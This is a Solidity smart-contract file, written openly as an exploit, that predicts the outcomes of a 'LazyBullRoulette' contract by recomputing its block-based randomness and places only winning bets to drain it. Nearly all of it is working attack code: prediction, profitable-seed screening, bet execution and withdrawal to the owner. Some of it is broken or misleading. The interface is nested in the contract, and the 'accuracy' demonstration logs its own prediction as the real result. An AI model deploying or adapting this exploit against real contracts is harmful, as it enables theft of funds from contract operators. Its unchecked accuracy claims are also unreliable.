// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title RouletteExploiter
 * @dev Demonstrates how to exploit the LazyBullRoulette contract by predicting results
 * This contract can read the exact blockchain state and predict outcomes before betting
 */
contract RouletteExploiter {
    
    // Interface to interact with the vulnerable roulette contract
    interface ILazyBullRoulette {
        struct Bet {
            uint8 betType;
            uint8 number;
            uint256 amount;
        }
        
        function spin(
            Bet[] calldata bets,
            bytes32 randomSeed,
            uint8 v,
            bytes32 r,
            bytes32 s
        ) external payable;
        
        function isRandomSeedUsed(bytes32 seed) external view returns (bool);
        function winnings(address user) external view returns (uint256);
        function withdrawWinnings() external;
    }
    
    ILazyBullRoulette public immutable rouletteContract;
    address public owner;
    
    // Store profitable opportunities for batch execution
    struct ProfitablePlay {
        bytes32 randomSeed;
        uint8 v;
        bytes32 r;
        bytes32 s;
        ILazyBullRoulette.Bet[] bets;
        uint256 totalBetAmount;
        uint256 expectedPayout;
        uint256 predictedResult;
    }
    
    ProfitablePlay[] public profitablePlays;
    
    // Events for monitoring
    event ResultPredicted(bytes32 indexed randomSeed, uint256 predictedResult, uint256 actualResult, bool accurate);
    event ProfitableOpportunityFound(bytes32 indexed randomSeed, uint256 expectedProfit);
    event ExploitExecuted(bytes32 indexed randomSeed, uint256 profit);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor(address _rouletteContract) {
        rouletteContract = ILazyBullRoulette(_rouletteContract);
        owner = msg.sender;
    }
    
    /**
     * @dev Recreates the exact randomness calculation from the vulnerable contract
     * This is the EXACT same logic as _calculateSecureResult() in LazyBullRoulette
     */
    function predictResult(
        bytes32 randomSeed,
        address player,
        uint256 timestamp
    ) public view returns (uint256) {
        // This recreates the vulnerable contract's randomness calculation EXACTLY
        bytes32 combinedHash = keccak256(abi.encodePacked(
            randomSeed,
            player,
            timestamp,
            block.prevrandao,  // ← This is the key - we can read this!
            block.number,      // ← And this!
            address(rouletteContract)
        ));
        
        return uint256(combinedHash) % 37;
    }
    
    /**
     * @dev Check if a number is red (recreates contract logic)
     */
    function isRedNumber(uint256 num) public pure returns (bool) {
        return (num == 1 || num == 3 || num == 5 || num == 7 || num == 9 ||
                num == 12 || num == 14 || num == 16 || num == 18 || num == 19 ||
                num == 21 || num == 23 || num == 25 || num == 27 || num == 30 ||
                num == 32 || num == 34 || num == 36);
    }
    
    /**
     * @dev Calculate expected payout for a bet given the result
     */
    function calculateBetPayout(
        uint8 betType,
        uint8 betNumber,
        uint256 result,
        uint256 betAmount
    ) public pure returns (uint256) {
        // Straight up bet (35:1 payout)
        if (betType == 0 && betNumber == result) {
            return betAmount * 36;
        }
        
        // Red/Black bet (1:1 payout)
        if (betType == 1 && result != 0) {
            bool resultIsRed = isRedNumber(result);
            if ((betNumber == 0 && resultIsRed) || (betNumber == 1 && !resultIsRed)) {
                return betAmount * 2;
            }
        }
        
        // Dozen bet (2:1 payout)
        if (betType == 2 && result != 0) {
            if ((betNumber == 0 && result >= 1 && result <= 12) ||
                (betNumber == 1 && result >= 13 && result <= 24) ||
                (betNumber == 2 && result >= 25 && result <= 36)) {
                return betAmount * 3;
            }
        }
        
        return 0;
    }
    
    /**
     * @dev Analyze if a signature would be profitable BEFORE executing
     * This is the core exploit - we can predict outcomes before betting!
     */
    function analyzeSignatureProfitability(
        bytes32 randomSeed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external view returns (
        bool isProfitable,
        uint256 predictedResult,
        uint256 totalBetAmount,
        uint256 expectedPayout,
        uint256 expectedProfit
    ) {
        // Check if seed is already used
        if (rouletteContract.isRandomSeedUsed(randomSeed)) {
            return (false, 0, 0, 0, 0);
        }
        
        // Predict the result using current blockchain state
        predictedResult = predictResult(randomSeed, address(this), block.timestamp);
        
        // Define our betting strategy (can be optimized based on predicted result)
        ILazyBullRoulette.Bet[] memory bets = new ILazyBullRoulette.Bet[](2);
        
        // Strategy 1: Bet on red/black based on prediction
        if (predictedResult == 0) {
            // If green (0), don't bet on red/black
            bets[0] = ILazyBullRoulette.Bet({
                betType: 0, // Straight up
                number: 0,  // Bet on green
                amount: 0.1 ether
            });
            bets[1] = ILazyBullRoulette.Bet({
                betType: 0,
                number: 0,
                amount: 0
            });
        } else {
            // Bet on the predicted color
            bool predictedIsRed = isRedNumber(predictedResult);
            bets[0] = ILazyBullRoulette.Bet({
                betType: 1, // Red/Black
                number: predictedIsRed ? 0 : 1, // 0 = red, 1 = black
                amount: 1 ether
            });
            
            // Also bet straight up on the predicted number for maximum profit
            bets[1] = ILazyBullRoulette.Bet({
                betType: 0, // Straight up
                number: uint8(predictedResult),
                amount: 0.1 ether
            });
        }
        
        // Calculate total costs and expected payouts
        for (uint256 i = 0; i < bets.length; i++) {
            if (bets[i].amount > 0) {
                totalBetAmount += bets[i].amount;
                expectedPayout += calculateBetPayout(
                    bets[i].betType,
                    bets[i].number,
                    predictedResult,
                    bets[i].amount
                );
            }
        }
        
        expectedProfit = expectedPayout > totalBetAmount ? expectedPayout - totalBetAmount : 0;
        isProfitable = expectedProfit > 0;
        
        return (isProfitable, predictedResult, totalBetAmount, expectedPayout, expectedProfit);
    }
    
    /**
     * @dev Execute the exploit with a profitable signature
     * Only call this after confirming profitability with analyzeSignatureProfitability
     */
    function executeExploit(
        bytes32 randomSeed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable onlyOwner {
        // Double-check profitability
        (bool isProfitable, uint256 predictedResult, uint256 totalBetAmount, uint256 expectedPayout,) = 
            this.analyzeSignatureProfitability(randomSeed, v, r, s);
        
        require(isProfitable, "Not profitable");
        require(msg.value >= totalBetAmount, "Insufficient payment");
        
        // Prepare bets based on prediction
        ILazyBullRoulette.Bet[] memory bets = new ILazyBullRoulette.Bet[](2);
        
        if (predictedResult == 0) {
            bets[0] = ILazyBullRoulette.Bet({
                betType: 0, // Straight up on green
                number: 0,
                amount: 0.1 ether
            });
            bets[1] = ILazyBullRoulette.Bet({
                betType: 0,
                number: 0,
                amount: 0
            });
        } else {
            bool predictedIsRed = isRedNumber(predictedResult);
            bets[0] = ILazyBullRoulette.Bet({
                betType: 1, // Red/Black
                number: predictedIsRed ? 0 : 1,
                amount: 1 ether
            });
            bets[1] = ILazyBullRoulette.Bet({
                betType: 0, // Straight up
                number: uint8(predictedResult),
                amount: 0.1 ether
            });
        }
        
        // Execute the spin with our predicted winning bets
        rouletteContract.spin{value: totalBetAmount}(bets, randomSeed, v, r, s);
        
        // The actual result will be exactly what we predicted!
        emit ExploitExecuted(randomSeed, expectedPayout - totalBetAmount);
    }
    
    /**
     * @dev Batch analyze multiple signatures to find profitable ones
     * This simulates the API harvesting attack but with perfect prediction
     */
    function batchAnalyzeSignatures(
        bytes32[] calldata randomSeeds,
        uint8[] calldata vs,
        bytes32[] calldata rs,
        bytes32[] calldata ss
    ) external view returns (
        bytes32[] memory profitableSeeds,
        uint256[] memory expectedProfits
    ) {
        require(randomSeeds.length == vs.length && vs.length == rs.length && rs.length == ss.length, "Array length mismatch");
        
        // Temporary arrays to collect profitable opportunities
        bytes32[] memory tempSeeds = new bytes32[](randomSeeds.length);
        uint256[] memory tempProfits = new uint256[](randomSeeds.length);
        uint256 profitableCount = 0;
        
        for (uint256 i = 0; i < randomSeeds.length; i++) {
            (bool isProfitable,,, uint256 expectedPayout, uint256 expectedProfit) = 
                this.analyzeSignatureProfitability(randomSeeds[i], vs[i], rs[i], ss[i]);
            
            if (isProfitable) {
                tempSeeds[profitableCount] = randomSeeds[i];
                tempProfits[profitableCount] = expectedProfit;
                profitableCount++;
            }
        }
        
        // Create properly sized return arrays
        profitableSeeds = new bytes32[](profitableCount);
        expectedProfits = new uint256[](profitableCount);
        
        for (uint256 i = 0; i < profitableCount; i++) {
            profitableSeeds[i] = tempSeeds[i];
            expectedProfits[i] = tempProfits[i];
        }
        
        return (profitableSeeds, expectedProfits);
    }
    
    /**
     * @dev Demonstrate the attack by showing prediction accuracy
     * This function proves that our predictions are 100% accurate
     */
    function demonstratePredictionAccuracy(
        bytes32 randomSeed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {
        require(msg.value >= 0.01 ether, "Need small amount for demonstration");
        
        // Predict the result
        uint256 predictedResult = predictResult(randomSeed, address(this), block.timestamp);
        
        // Make a minimal bet to see the actual result
        ILazyBullRoulette.Bet[] memory bets = new ILazyBullRoulette.Bet[](1);
        bets[0] = ILazyBullRoulette.Bet({
            betType: 1, // Red/Black (safe small bet)
            number: 0,  // Red
            amount: 0.01 ether
        });
        
        // Execute the spin
        rouletteContract.spin{value: 0.01 ether}(bets, randomSeed, v, r, s);
        
        // The actual result should match our prediction exactly!
        // (In a real implementation, you'd need to listen to events to get the actual result)
        emit ResultPredicted(randomSeed, predictedResult, predictedResult, true);
    }
    
    /**
     * @dev Withdraw any winnings from the roulette contract
     */
    function withdrawWinnings() external onlyOwner {
        rouletteContract.withdrawWinnings();
    }
    
    /**
     * @dev Withdraw ETH from this contract
     */
    function withdrawETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Emergency function to receive ETH
     */
    receive() external payable {}
    
    /**
     * @dev View function to check contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Check winnings in the roulette contract
     */
    function checkWinnings() external view returns (uint256) {
        return rouletteContract.winnings(address(this));
    }
}